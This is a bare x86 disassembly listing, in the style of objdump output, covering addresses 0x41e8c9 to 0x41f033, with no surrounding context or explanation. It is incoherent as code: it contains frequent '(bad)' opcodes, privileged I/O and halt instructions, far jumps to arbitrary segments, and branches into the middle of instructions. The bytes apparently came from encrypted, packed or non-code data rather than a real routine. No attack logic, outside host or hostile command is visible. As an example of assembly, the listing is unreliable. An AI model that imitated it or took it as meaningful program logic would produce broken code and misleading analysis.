  41e8c9:	sbb    eax,0xa5357e60
  41e8ce:	in     al,0x1c
  41e8d0:	jne    0x41e874
  41e8d2:	adc    cl,dl
  41e8d4:	mov    DWORD PTR [ecx-0x4b],eax
  41e8d7:	lods   al,BYTE PTR ds:[esi]
  41e8d9:	jmp    0x98cc:0x3543c139
  41e8e0:	lea    ebp,[ebp+0x37]
  41e8e3:	enter  0xd40e,0x7f
  41e8e7:	inc    edx
  41e8e8:	dec    ebp
  41e8e9:	ud0    ebx,DWORD PTR [ecx]
  41e8ec:	or     al,0xf1
  41e8ee:	fiadd  DWORD PTR [ebx-0x77]
  41e8f1:	mov    esp,0x6d5d7995
  41e8f6:	pop    edx
  41e8f7:	dec    edi
  41e8f8:	jns    0x41e955
  41e8fa:	xchg   ebp,eax
  41e8fb:	adc    BYTE PTR gs:[ebx],bh
  41e8fe:	imul   ebx,ecx,0xd71100eb
  41e904:	mov    eax,0xb4e23386
  41e909:	data16 mov bh,0x12
  41e90c:	adc    DWORD PTR [edi-0x723c1715],0x55af1bf7
  41e916:	lea    ebx,[ebx+0x64]
  41e919:	sbb    esp,eax
  41e91b:	in     eax,0xb4
  41e91d:	(bad)  
  41e91e:	hlt    
  41e91f:	pcmpgtd mm1,QWORD PTR [esp+edi*1+0x46da581a]
  41e927:	shr    DWORD PTR [eax+0x39],0x49
  41e92b:	add    al,0x45
  41e92d:	mov    ah,0x91
  41e92f:	inc    ebx
  41e930:	daa    
  41e931:	es cs loop 0x41e8e5
  41e935:	inc    eax
  41e936:	inc    eax
  41e937:	cmp    ecx,DWORD PTR [ecx+edx*1]
  41e93a:	das    
  41e93b:	mov    DWORD PTR [ebx+esi*4+0x3d],esp
  41e93f:	xchg   DWORD PTR [edi+esi*4-0x4b],edi
  41e943:	ret    0x8973
  41e946:	or     DWORD PTR [ebx+0x4ebe7c5e],esp
  41e94c:	mov    eax,ds:0x1ac97680
  41e951:	repnz or eax,0x1c3600d8
  41e957:	push   ds
  41e958:	out    dx,al
  41e959:	imul   edi,DWORD PTR [esi-0x618e85dc],0x276f2cc2
  41e963:	or     ebp,DWORD PTR ds:0xd9dbda91
  41e969:	les    ebx,FWORD PTR [edi-0x5c]
  41e96c:	gs jl  0x41e9c5
  41e96f:	mov    DWORD PTR [edx],eax
  41e971:	sahf   
  41e972:	mov    ah,0x20
  41e974:	jl     0x41e90d
  41e976:	push   ebp
  41e977:	fisub  WORD PTR [ecx-0x1f0fdde0]
  41e97d:	aas    
  41e97e:	scas   eax,DWORD PTR es:[edi]
  41e97f:	mov    ebp,esp
  41e981:	cld    
  41e982:	shl    BYTE PTR [ecx],cl
  41e984:	imul   eax,DWORD PTR [esp+edx*2+0x31],0xbeb271f9
  41e98c:	add    dl,0xd2
  41e98f:	sub    BYTE PTR [ebx-0x4fcbcf12],ah
  41e995:	xchg   BYTE PTR [ebp-0x37a05659],ah
  41e99b:	fst    DWORD PTR ds:0x71b36eb8
  41e9a1:	jnp    0x41ea02
  41e9a3:	push   eax
  41e9a4:	fidivr WORD PTR [edx+0x65]
  41e9a7:	fdivr  QWORD PTR ds:0xfcf80d1b
  41e9ad:	xchg   edi,eax
  41e9ae:	loope  0x41e9fb
  41e9b0:	xchg   esi,eax
  41e9b1:	cmp    al,0x22
  41e9b3:	sub    BYTE PTR [ebp+0xb2a9bcf],ah
  41e9b9:	pop    ss
  41e9ba:	pop    ds
  41e9bb:	dec    edi
  41e9bc:	xchg   ecx,eax
  41e9bd:	xchg   edx,eax
  41e9be:	daa    
  41e9bf:	push   esp
  41e9c0:	pop    eax
  41e9c1:	xor    al,0xc3
  41e9c3:	daa    
  41e9c4:	in     eax,0xf2
  41e9c6:	inc    ecx
  41e9c7:	fst    DWORD PTR [eax-0x5a8c0d6b]
  41e9cd:	lock lods eax,DWORD PTR ds:[esi]
  41e9cf:	inc    ecx
  41e9d0:	repnz stos BYTE PTR es:[edi],al
  41e9d2:	mov    ah,0xf6
  41e9d4:	int3   
  41e9d5:	(bad)  
  41e9d6:	pop    edi
  41e9d7:	sub    DWORD PTR [edx],ebp
  41e9d9:	cmp    BYTE PTR [ebx+0x3c4646f],cl
  41e9df:	enter  0x90cf,0x58
  41e9e3:	daa    
  41e9e4:	(bad)  
  41e9e5:	xchg   ebx,eax
  41e9e6:	sub    eax,0x7cd0bda
  41e9eb:	mov    eax,0x25756086
  41e9f0:	mov    ds:0xc306fdc0,al
  41e9f5:	add    al,0xc3
  41e9f7:	sub    eax,0xbae2a5fc
  41e9fc:	in     eax,dx
  41e9fd:	cmp    bh,BYTE PTR [ebp+0x4d5863ef]
  41ea03:	jo     0x41e9bd
  41ea05:	push   esp
  41ea06:	ins    BYTE PTR es:[edi],dx
  41ea07:	fld    TBYTE PTR [edx]
  41ea09:	jmp    0x3573:0x94d8bccb
  41ea10:	inc    ecx
  41ea11:	(bad)  
  41ea12:	loop   0x41e9fa
  41ea14:	clc    
  41ea15:	or     eax,0x680e272
  41ea1a:	clc    
  41ea1b:	mov    ds:0xace970ee,eax
  41ea20:	enter  0x90b5,0xcd
  41ea24:	sub    DWORD PTR [eax+0x6c768461],edx
  41ea2a:	psubusb mm5,mm1
  41ea2d:	cmp    eax,0xc2b37d92
  41ea32:	scas   eax,DWORD PTR es:[edi]
  41ea33:	daa    
  41ea34:	test   al,0x86
  41ea36:	fidivr WORD PTR [ebp+edx*2-0x5ebfcc23]
  41ea3d:	pop    ds
  41ea3e:	xchg   esp,eax
  41ea3f:	into   
  41ea40:	ds mov esi,0x3b80baf4
  41ea46:	dec    eax
  41ea47:	mul    BYTE PTR [ebp-0x75]
  41ea4a:	retf   
  41ea4b:	imul   ecx,DWORD PTR [ecx-0x4f],0x2b2cce3c
  41ea52:	mov    al,ds:0x1c3d821c
  41ea57:	cli    
  41ea58:	fprem  
  41ea5a:	mov    al,ds:0x31d8743b
  41ea5f:	enter  0x9c5d,0xc
  41ea63:	pop    ds
  41ea64:	adc    ch,BYTE PTR [edi-0x6a816101]
  41ea6a:	stos   DWORD PTR es:[edi],eax
  41ea6b:	mov    BYTE PTR [ecx-0x19],dh
  41ea6e:	repnz mov ch,0xf3
  41ea71:	retf   
  41ea72:	popa   
  41ea73:	stos   BYTE PTR es:[edi],al
  41ea74:	lock jno 0x41ea66
  41ea77:	fwait
  41ea78:	mov    BYTE PTR [edx+0xa5416e4],dl
  41ea7e:	test   DWORD PTR [ebx+0x19],0xcee06e85
  41ea85:	stc    
  41ea86:	(bad)  
  41ea87:	mov    ah,0x43
  41ea89:	mov    eax,0x4388f73
  41ea8e:	imul   ebx,DWORD PTR [edx-0x52cf7f44],0xffffff9a
  41ea95:	lds    edi,FWORD PTR [esi]
  41ea97:	out    0x73,al
  41ea99:	pop    ds
  41ea9a:	je     0x41ea57
  41ea9c:	dec    eax
  41ea9d:	mov    eax,0x2e33f4fa
  41eaa2:	adc    al,0x4a
  41eaa4:	popaw  
  41eaa6:	xlat   BYTE PTR ds:[ebx]
  41eaa7:	jp     0x41eb1a
  41eaa9:	or     al,0x46
  41eaab:	push   ss
  41eaac:	es mov eax,0x10f7fe06
  41eab2:	add    al,0x79
  41eab4:	mov    al,0xd4
  41eab6:	mov    esi,0x836e06ab
  41eabb:	pop    esp
  41eabc:	es lahf 
  41eabe:	pop    eax
  41eabf:	fistp  WORD PTR [ebx+ebp*8+0x19]
  41eac3:	mov    edx,edx
  41eac5:	popa   
  41eac6:	mov    ds:0x318e8588,eax
  41eacb:	mov    BYTE PTR [edx+eiz*1+0x24],cl
  41eacf:	shr    BYTE PTR [ecx],1
  41ead1:	call   0x683224b2
  41ead6:	push   ds
  41ead7:	cli    
  41ead8:	aam    0xb4
  41eada:	inc    edi
  41eadb:	loop   0x41eb58
  41eadd:	pop    es
  41eade:	sub    eax,0x60d6b5da
  41eae3:	mov    esi,0x6e2c2cd7
  41eae8:	xchg   esi,eax
  41eae9:	sub    DWORD PTR [ebx],edx
  41eaeb:	imul   esp,DWORD PTR [edx],0xffffffb7
  41eaee:	scas   al,BYTE PTR es:[edi]
  41eaef:	mov    ?,WORD PTR [edi+0x2f9c2c0a]
  41eaf5:	loope  0x41eb3c
  41eaf7:	mov    ebx,0xc51d383b
  41eafc:	pop    ebx
  41eafd:	push   ebx
  41eafe:	cmp    al,0x24
  41eb00:	jnp    0x41eb73
  41eb02:	push   ecx
  41eb03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb04:	sub    al,bl
  41eb06:	jp     0x41eae5
  41eb08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb09:	adc    DWORD PTR [ebx-0x44c29938],0xb218c8c6
  41eb13:	lods   eax,DWORD PTR ds:[esi]
  41eb14:	and    eax,0xdad7b69d
  41eb19:	xchg   ecx,eax
  41eb1a:	aad    0x24
  41eb1c:	jmp    0x41eb4b
  41eb1e:	sbb    eax,0x76b2a4b3
  41eb23:	pop    esi
  41eb24:	jecxz  0x41eb87
  41eb26:	(bad)  
  41eb27:	fbld   TBYTE PTR [ebp-0x20]
  41eb2a:	stos   BYTE PTR es:[edi],al
  41eb2b:	cld    
  41eb2c:	fwait
  41eb2d:	add    bh,BYTE PTR [ebx-0x21]
  41eb30:	scas   al,BYTE PTR es:[edi]
  41eb31:	mov    gs,WORD PTR [esi-0x7954101b]
  41eb37:	fistp  DWORD PTR [ebp-0x73]
  41eb3a:	pop    ss
  41eb3b:	mov    esp,0x4efe6a0b
  41eb40:	aas    
  41eb41:	and    BYTE PTR [edx+0x4f],bl
  41eb44:	jno    0x41eb5d
  41eb46:	shr    ebx,1
  41eb48:	lods   al,BYTE PTR ds:[esi]
  41eb49:	mov    WORD PTR [esi-0x7e],ds
  41eb4c:	dec    ebx
  41eb4d:	jmp    0x41eaf2
  41eb4f:	xor    bl,BYTE PTR [eax]
  41eb51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb52:	mov    dl,dh
  41eb54:	rol    bh,cl
  41eb56:	mov    BYTE PTR [ecx+edi*4-0x33],dh
  41eb5a:	xchg   ebp,eax
  41eb5b:	shl    DWORD PTR ds:0x6545a242,1
  41eb61:	mov    esp,0x147093bf
  41eb66:	pop    ebx
  41eb67:	xchg   ebp,eax
  41eb68:	xchg   ebp,eax
  41eb69:	mov    eax,0xc8f78257
  41eb6e:	push   ds
  41eb6f:	ss addr16 inc esp
  41eb72:	push   0x1235bfb5
  41eb77:	shr    DWORD PTR [edx],cl
  41eb79:	pop    ds
  41eb7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb7b:	xchg   BYTE PTR [edi+0x76],ch
  41eb7e:	call   0x166b05bf
  41eb83:	pop    ss
  41eb84:	and    dl,cl
  41eb86:	loope  0x41eb90
  41eb88:	clc    
  41eb89:	sbb    DWORD PTR ds:0x204ae921,esp
  41eb8f:	cmp    eax,0x5311ce42
  41eb94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb95:	pop    bx
  41eb97:	jle    0x41ebff
  41eb99:	mov    eax,ds:0x9796bffa
  41eb9e:	test   BYTE PTR [ecx-0x5d11f229],cl
  41eba4:	sub    edx,DWORD PTR [eax]
  41eba6:	(bad)  
  41eba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eba9:	mov    esp,0x76be8358
  41ebae:	sar    dh,cl
  41ebb0:	xchg   ebp,eax
  41ebb1:	stos   DWORD PTR es:[edi],eax
  41ebb2:	mov    ch,0x33
  41ebb4:	xchg   edi,eax
  41ebb5:	xor    al,0x5f
  41ebb7:	lahf   
  41ebb8:	dec    edx
  41ebb9:	lods   al,BYTE PTR ds:[esi]
  41ebba:	loop   0x41ebb3
  41ebbc:	and    esp,DWORD PTR [edx+0x26174316]
  41ebc2:	sbb    eax,0xed74d853
  41ebc7:	and    ecx,DWORD PTR [ebp-0x599ba706]
  41ebcd:	jne    0x41ec46
  41ebcf:	ret    
  41ebd0:	fcmovnb st,st(2)
  41ebd2:	sbb    BYTE PTR [ecx+0x4fee6098],dl
  41ebd8:	sub    BYTE PTR [ecx],dh
  41ebda:	xor    esp,DWORD PTR [esi]
  41ebdc:	pop    ecx
  41ebdd:	mov    BYTE PTR ds:0x185464b8,bl
  41ebe3:	dec    edx
  41ebe4:	jno    0x41ec2f
  41ebe6:	dec    ecx
  41ebe7:	js     0x41eba9
  41ebe9:	add    eax,0x23e41719
  41ebee:	sbb    eax,0x9b9a00fc
  41ebf3:	cmp    DWORD PTR [eax+0x5d],ebx
  41ebf6:	push   0x579c8358
  41ebfb:	mov    cl,bh
  41ebfd:	xchg   esi,eax
  41ebfe:	enter  0x6258,0x86
  41ec02:	clc    
  41ec03:	push   0x18185bf2
  41ec08:	adc    BYTE PTR [esi-0xc],ch
  41ec0b:	pusha  
  41ec0c:	or     BYTE PTR [edx+0x9d3ad5a],ch
  41ec12:	mov    esi,0x2dd11445
  41ec17:	fmul   DWORD PTR [edi+esi*1+0x7dce96ac]
  41ec1e:	mov    ebx,0xf51e9031
  41ec23:	push   eax
  41ec24:	add    al,0x71
  41ec26:	jle    0x41ebf3
  41ec28:	sub    DWORD PTR [ecx-0xaae201f],eax
  41ec2e:	dec    esp
  41ec2f:	mov    DWORD PTR [ecx-0x50],0x1534a649
  41ec36:	jno    0x41ebf4
  41ec38:	inc    edx
  41ec39:	(bad)  [esp+eax*2+0x157cea45]
  41ec40:	sbb    eax,0xa4e2b892
  41ec45:	inc    esp
  41ec46:	and    BYTE PTR [edx+0x226696cc],dh
  41ec4c:	pop    ss
  41ec4d:	test   al,0xa5
  41ec4f:	bnd jg 0x41eca4
  41ec52:	jle    0x41ecc1
  41ec54:	xchg   ecx,eax
  41ec55:	or     al,0x63
  41ec57:	pop    es
  41ec58:	inc    DWORD PTR [ebx-0x22]
  41ec5b:	or     bl,BYTE PTR [ebp+0x24]
  41ec5e:	cmc    
  41ec5f:	sub    dl,BYTE PTR [ecx]
  41ec61:	es sub bl,ch
  41ec64:	scas   eax,DWORD PTR es:[edi]
  41ec65:	fstp   QWORD PTR [edx-0x11b0bc2a]
  41ec6b:	(bad)  
  41ec6c:	or     BYTE PTR [di+0x4421],ch
  41ec71:	sub    dl,dl
  41ec73:	or     eax,0xa01d960f
  41ec78:	call   0x1071:0xd1515065
  41ec7f:	adc    eax,0xc92c5462
  41ec84:	and    al,0xce
  41ec86:	mov    dl,0x75
  41ec88:	and    DWORD PTR [ebp-0x45],ebx
  41ec8b:	cmc    
  41ec8c:	add    al,0x14
  41ec8e:	and    eax,0xdd68e70
  41ec93:	sahf   
  41ec94:	and    BYTE PTR [eax],ah
  41ec96:	dec    ebp
  41ec97:	dec    edx
  41ec98:	dec    esi
  41ec99:	lahf   
  41ec9a:	xor    ebp,DWORD PTR [eax+0x66759d03]
  41eca0:	mov    bl,0x17
  41eca2:	jge    0x41ecaa
  41eca4:	inc    esp
  41eca5:	stos   BYTE PTR es:[edi],al
  41eca6:	loope  0x41ed14
  41eca8:	imul   esi,DWORD PTR [ecx+0x16],0xffffff8e
  41ecac:	and    bh,BYTE PTR [ebx+edi*8+0x3]
  41ecb0:	lods   eax,DWORD PTR ds:[esi]
  41ecb1:	ins    DWORD PTR es:[edi],dx
  41ecb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecb3:	adc    DWORD PTR ds:0xc9b4284e,ebp
  41ecb9:	cmp    BYTE PTR [ebp-0x541c329],bh
  41ecbf:	popf   
  41ecc0:	jno    0x41ec8c
  41ecc2:	inc    eax
  41ecc3:	xchg   ecx,eax
  41ecc4:	jne    0x41ecc4
  41ecc6:	or     al,0xe9
  41ecc8:	in     eax,0x37
  41ecca:	and    DWORD PTR [ecx-0x73],ebx
  41eccd:	fwait
  41ecce:	sbb    ebx,0xffffffbd
  41ecd1:	sub    ch,BYTE PTR [ebx+esi*1-0xc8a57f3]
  41ecd8:	ja     0x41ecfa
  41ecda:	data16 fisubr WORD PTR [eax]
  41ecdd:	cdq    
  41ecde:	adc    bh,BYTE PTR [ecx]
  41ece0:	cmp    ah,BYTE PTR [ecx-0x22]
  41ece3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ece4:	fidivr DWORD PTR [ecx+0x3a45a763]
  41ecea:	sub    ebp,DWORD PTR [eax-0x1d506a80]
  41ecf0:	bnd js 0x41ed70
  41ecf3:	cmp    bl,BYTE PTR ds:0xe2d6bcd4
  41ecf9:	retf   
  41ecfa:	jecxz  0x41ec7f
  41ecfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecfd:	mov    ?,WORD PTR [edx]
  41ecff:	std    
  41ed00:	and    DWORD PTR [ebx+0x20],ebx
  41ed03:	or     DWORD PTR [edi+ebx*2-0x17],ebx
  41ed07:	pushf  
  41ed08:	adc    cl,bl
  41ed0a:	cld    
  41ed0b:	dec    edx
  41ed0c:	xchg   esi,eax
  41ed0d:	enter  0xa2db,0x76
  41ed11:	ins    BYTE PTR es:[edi],dx
  41ed12:	xchg   edi,eax
  41ed13:	cmp    esp,DWORD PTR [ecx]
  41ed15:	push   ss
  41ed16:	mov    esi,DWORD PTR [esi-0x7]
  41ed19:	cwde   
  41ed1a:	adc    ebp,DWORD PTR [esi-0x1fb1a08f]
  41ed20:	push   ebx
  41ed21:	sub    DWORD PTR [ebp+edi*2-0x68],ecx
  41ed25:	xchg   ebx,eax
  41ed26:	mov    ebx,0x6477c386
  41ed2b:	loop   0x41ed15
  41ed2d:	cmp    BYTE PTR [edi-0x68],dh
  41ed30:	add    DWORD PTR [edx+0x76840a6f],edx
  41ed36:	pusha  
  41ed37:	test   BYTE PTR [eax-0x22],ah
  41ed3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed3b:	test   DWORD PTR [edx-0xb],ecx
  41ed3e:	imul   ebx,eax,0xaddf2b24
  41ed44:	lahf   
  41ed45:	cmp    BYTE PTR [esi+eiz*1],al
  41ed48:	cs jmp 0x41edae
  41ed4b:	fadd   QWORD PTR [esi+ebp*1-0x52]
  41ed4f:	lock adc edi,esi
  41ed52:	pusha  
  41ed53:	pop    ds
  41ed54:	xor    BYTE PTR [ebx],0x9
  41ed57:	xor    esp,DWORD PTR [ecx]
  41ed59:	xor    al,0x82
  41ed5b:	xchg   BYTE PTR [ebx+0x2d],ah
  41ed5e:	or     bh,BYTE PTR [eax]
  41ed60:	jb     0x41ecf4
  41ed62:	mov    ebp,0x12f6b61a
  41ed67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed68:	js     0x41ede9
  41ed6a:	cmp    al,0x7a
  41ed6c:	aam    0x30
  41ed6e:	inc    ebp
  41ed6f:	bound  ebp,QWORD PTR [ebp-0x523f921c]
  41ed75:	pop    ebx
  41ed76:	pop    ds
  41ed77:	dec    esi
  41ed78:	mov    ecx,0xe3db31f9
  41ed7d:	dec    ebp
  41ed7e:	dec    edi
  41ed7f:	(bad)  
  41ed80:	lock sub ch,ah
  41ed83:	pop    esp
  41ed84:	push   es
  41ed85:	mov    ecx,0x85e6742
  41ed8a:	loop   0x41ed3e
  41ed8c:	push   ebx
  41ed8d:	icebp  
  41ed8e:	stc    
  41ed8f:	mov    al,0x5b
  41ed91:	inc    edx
  41ed92:	jp     0x41ede8
  41ed94:	je     0x41edcf
  41ed96:	inc    ebx
  41ed97:	pop    es
  41ed98:	mov    ah,0xd6
  41ed9a:	rol    BYTE PTR [esi+0x4ac44c3c],cl
  41eda0:	fwait
  41eda1:	inc    ebx
  41eda2:	mov    ah,0x64
  41eda4:	mov    ds:0x957ed9b9,al
  41eda9:	(bad)
  41edac:	add    DWORD PTR [ecx+0x50c63058],esi
  41edb2:	jmp    0x493:0x5bca5826
  41edb9:	add    DWORD PTR [ecx-0x4aa6db47],ebx
  41edbf:	xlat   BYTE PTR ds:[ebx]
  41edc0:	push   cs
  41edc1:	and    ch,BYTE PTR [eax]
  41edc3:	jl     0x41ee33
  41edc5:	gs pushw ss
  41edc8:	push   ds
  41edc9:	jle    0x41ee44
  41edcb:	pushf  
  41edcc:	mov    ds:0x3eb40275,al
  41edd1:	mov    ds:0x9e017639,al
  41edd6:	sbb    edx,DWORD PTR [eax-0x4129f19a]
  41eddc:	(bad)  
  41eddd:	into   
  41edde:	adc    BYTE PTR [ecx+0x5c37f90a],bh
  41ede4:	sbb    esp,DWORD PTR [esp+eax*8-0x59]
  41ede8:	ins    DWORD PTR es:[edi],dx
  41ede9:	in     al,dx
  41edea:	mov    esi,0xa69745a4
  41edef:	nop
  41edf0:	inc    edx
  41edf1:	sub    DWORD PTR [ebx-0x7c65af4a],ebx
  41edf7:	sbb    cl,BYTE PTR [eax+0x79]
  41edfa:	dec    ecx
  41edfb:	pop    edx
  41edfc:	push   ds
  41edfd:	clc    
  41edfe:	jg     0x41edb1
  41ee00:	and    BYTE PTR [ebx*2+0x25f214c7],bl
  41ee07:	leave  
  41ee08:	and    bl,BYTE PTR [esi+0x61]
  41ee0b:	test   BYTE PTR [eax-0x5271157e],bh
  41ee11:	jp     0x41edf8
  41ee13:	lds    esi,FWORD PTR [ebx-0x55]
  41ee16:	fs ja  0x41ee11
  41ee19:	sahf   
  41ee1a:	mov    ebx,0xfa32a6fe
  41ee1f:	loope  0x41ee57
  41ee21:	sbb    eax,0x759df89a
  41ee26:	hlt    
  41ee27:	adc    eax,0xf2529750
  41ee2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee2d:	ret    0xecdf
  41ee30:	hlt    
  41ee31:	pushf  
  41ee32:	shr    DWORD PTR ds:0x268c8549,1
  41ee38:	sar    DWORD PTR [ebx+edx*2-0x6c],cl
  41ee3c:	or     DWORD PTR [ebx],ebp
  41ee3e:	mov    al,0xaf
  41ee40:	iret   
  41ee41:	ds nop
  41ee43:	jnp    0x41ee5c
  41ee45:	jb     0x41ee33
  41ee47:	jo     0x41edd7
  41ee49:	jle    0x41eeb9
  41ee4b:	fistp  DWORD PTR [ecx-0x3d]
  41ee4e:	cmp    cl,ah
  41ee50:	in     eax,dx
  41ee51:	jb     0x41ee18
  41ee53:	xor    al,0xa6
  41ee55:	jge    0x41eea6
  41ee57:	scas   al,BYTE PTR es:[edi]
  41ee58:	scas   al,BYTE PTR es:[edi]
  41ee59:	fisubr DWORD PTR [ebx-0x667032d]
  41ee5f:	pop    ds
  41ee60:	xor    ebp,DWORD PTR [edx+0x5]
  41ee63:	ss sub ecx,ebp
  41ee66:	pop    ss
  41ee67:	ja     0x41eed7
  41ee69:	stc    
  41ee6a:	sbb    al,0xe4
  41ee6c:	and    BYTE PTR [ebx+ebx*1-0x1eca508c],bl
  41ee73:	fcmovbe st,st(1)
  41ee75:	mov    eax,ds:0x430357c
  41ee7a:	pop    eax
  41ee7b:	mov    ds:0x70fc0cc,al
  41ee80:	test   ebx,0x31e5efd4
  41ee86:	in     al,0x7b
  41ee88:	xchg   ebx,eax
  41ee89:	and    ebp,DWORD PTR [edi+0x477f6926]
  41ee8f:	retf   
  41ee90:	out    dx,al
  41ee91:	jecxz  0x41ee35
  41ee93:	adc    dl,dl
  41ee95:	jp     0x41ef00
  41ee97:	xor    al,0x47
  41ee99:	es or  ax,0x3f42
  41ee9e:	xchg   ecx,eax
  41ee9f:	or     DWORD PTR [ebp+0x741dd68f],edi
  41eea5:	sub    al,0xf4
  41eea7:	aaa    
  41eea8:	ja     0x41eedf
  41eeaa:	daa    
  41eeab:	and    al,0x42
  41eead:	push   ecx
  41eeae:	sahf   
  41eeaf:	int3   
  41eeb0:	out    dx,eax
  41eeb1:	ja     0x41ee70
  41eeb3:	jnp    0x41eeaf
  41eeb5:	cdq    
  41eeb6:	arpl   WORD PTR [eax+0x3ed6dc00],dx
  41eebc:	mov    bh,0x10
  41eebe:	add    bl,dh
  41eec0:	sbb    DWORD PTR [eax*1-0x682fd0cd],ecx
  41eec7:	mov    edi,0x2118dcd7
  41eecc:	repnz pusha 
  41eece:	mov    ds:0x64d1a4b9,eax
  41eed3:	or     DWORD PTR [ecx+eax*4+0x70],edi
  41eed7:	pop    edx
  41eed8:	adc    esp,eax
  41eeda:	push   ecx
  41eedb:	sbb    ebx,esp
  41eedd:	fwait
  41eede:	ja     0xf2f518ae
  41eee4:	and    eax,0x19975724
  41eee9:	pop    ebx
  41eeea:	mov    dl,0x4f
  41eeec:	inc    edi
  41eeed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeee:	lods   al,BYTE PTR ds:[esi]
  41eeef:	and    eax,0xe9a1e18d
  41eef4:	addr16 popa 
  41eef6:	gs stos BYTE PTR es:[edi],al
  41eef8:	push   edi
  41eef9:	in     al,0x9d
  41eefb:	jmp    0x41eef8
  41eefd:	repnz dec edx
  41eeff:	call   0xb9dbd6f4
  41ef04:	xchg   BYTE PTR [edi-0x4c],ch
  41ef07:	arpl   bx,bx
  41ef09:	dec    edi
  41ef0a:	outs   dx,DWORD PTR ds:[esi]
  41ef0b:	shl    BYTE PTR [edx+0x65],0x31
  41ef0f:	fwait
  41ef10:	push   ds
  41ef11:	ret    
  41ef12:	(bad)  
  41ef13:	in     eax,0x35
  41ef15:	aas    
  41ef16:	xchg   ch,cl
  41ef18:	cmp    ebp,DWORD PTR [ebx+0x1f]
  41ef1b:	fcmovu st,st(6)
  41ef1d:	outs   dx,DWORD PTR ds:[esi]
  41ef1e:	adc    DWORD PTR [esi+ebp*2+0x76],0xffffffb1
  41ef23:	mov    dh,0xc0
  41ef25:	rcl    dl,0x23
  41ef28:	(bad)  
  41ef29:	xchg   esi,eax
  41ef2a:	dec    esi
  41ef2b:	popf   
  41ef2c:	fld    TBYTE PTR [edi+0x5c]
  41ef2f:	xor    DWORD PTR [ecx],esp
  41ef31:	cdq    
  41ef32:	aad    0x82
  41ef34:	int    0x34
  41ef36:	mov    WORD PTR [eax-0x2d6e83cc],?
  41ef3c:	test   eax,0x7d3e1701
  41ef41:	(bad)  ds:0xcf1c52ba
  41ef47:	inc    edx
  41ef48:	fcom   QWORD PTR [esi-0x2953ae58]
  41ef4e:	add    ch,BYTE PTR [edi-0x16974d5b]
  41ef54:	das    
  41ef55:	pop    esi
  41ef56:	xchg   ebp,eax
  41ef57:	jne    0x41eee6
  41ef59:	sbb    DWORD PTR [ebx],esp
  41ef5b:	in     al,dx
  41ef5c:	inc    edi
  41ef5d:	push   ebx
  41ef5e:	icebp  
  41ef5f:	mov    edx,0xc8459949
  41ef64:	je     0x41ef1b
  41ef66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef67:	dec    esi
  41ef68:	mov    DWORD PTR ds:0x4932a756,esi
  41ef6e:	imul   ebx,DWORD PTR [eax],0xd1d1df86
  41ef74:	pop    esp
  41ef75:	rcl    ecx,0x94
  41ef78:	rcr    DWORD PTR [ebp-0x2f],0xf3
  41ef7c:	add    dl,BYTE PTR [esp+ecx*4]
  41ef7f:	jl     0x41efba
  41ef81:	clc    
  41ef82:	sub    ah,BYTE PTR [ebx]
  41ef84:	mov    esp,0x8438b2bc
  41ef89:	mov    esp,0x935b82d3
  41ef8e:	(bad)  
  41ef90:	fisubr WORD PTR [edx+0x7c405eec]
  41ef96:	cmp    BYTE PTR [edi-0x5c],al
  41ef99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef9a:	fidivr DWORD PTR [ecx-0x44]
  41ef9d:	outs   dx,BYTE PTR ds:[esi]
  41ef9e:	cmp    ebx,esp
  41efa0:	ja     0x41ef65
  41efa2:	or     ecx,eax
  41efa4:	(bad)  
  41efa5:	push   edi
  41efa6:	mov    DWORD PTR [ecx-0x5b],ebp
  41efa9:	call   0x4b60210f
  41efae:	mov    esp,ecx
  41efb0:	mov    ch,0x6d
  41efb2:	jle    0x41ef52
  41efb4:	cld    
  41efb5:	mov    dh,0x7d
  41efb7:	or     BYTE PTR [esi+eax*2-0x703b73fb],dh
  41efbe:	xor    BYTE PTR ds:0xcc89373c,bh
  41efc4:	(bad)  
  41efc6:	in     al,0x68
  41efc8:	stos   BYTE PTR es:[edi],al
  41efc9:	(bad)  
  41efca:	mov    edi,ecx
  41efcc:	push   edi
  41efcd:	out    0xf9,eax
  41efcf:	fwait
  41efd0:	pop    ds
  41efd1:	mov    esi,0x5cbf3a9d
  41efd6:	pop    edx
  41efd7:	adc    BYTE PTR ds:0x503de060,0x32
  41efde:	add    al,ah
  41efe0:	std    
  41efe1:	aaa    
  41efe2:	sbb    DWORD PTR [edx-0x1e807369],ecx
  41efe8:	dec    ebx
  41efe9:	mov    dh,0x78
  41efeb:	pop    ecx
  41efec:	add    ecx,DWORD PTR [edi-0x706c7593]
  41eff2:	stc    
  41eff3:	fsub   DWORD PTR [edx+0x21]
  41eff6:	pop    ebx
  41eff7:	call   0x9a66:0x745247e2
  41effe:	int3   
  41efff:	xchg   edx,eax
  41f000:	jb     0x41efd4
  41f002:	mov    bh,al
  41f004:	inc    ebx
  41f005:	inc    esi
  41f006:	push   es
  41f007:	or     al,0xf
  41f009:	add    ah,BYTE PTR [ebx]
  41f00b:	mov    cl,0x94
  41f00d:	sbb    ebx,DWORD PTR [ebx+ecx*8-0x510bf63a]
  41f014:	xor    BYTE PTR [eax],al
  41f016:	or     BYTE PTR [esi],0x81
  41f019:	mov    bl,BYTE PTR [esp+ebp*1-0x5d85cd2f]
  41f020:	jno    0x41f074
  41f022:	add    edi,eax
  41f024:	pop    edi
  41f025:	out    dx,eax
  41f026:	or     BYTE PTR [esi-0x3d44b3a6],al
  41f02c:	lods   al,BYTE PTR ds:[esi]
  41f02d:	jne    0x41f059
  41f02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f030:	dec    esi
  41f031:	mov    cl,0xb2
  41f033:	cmp    BYTE PTR [ebx+0x31],0xe8
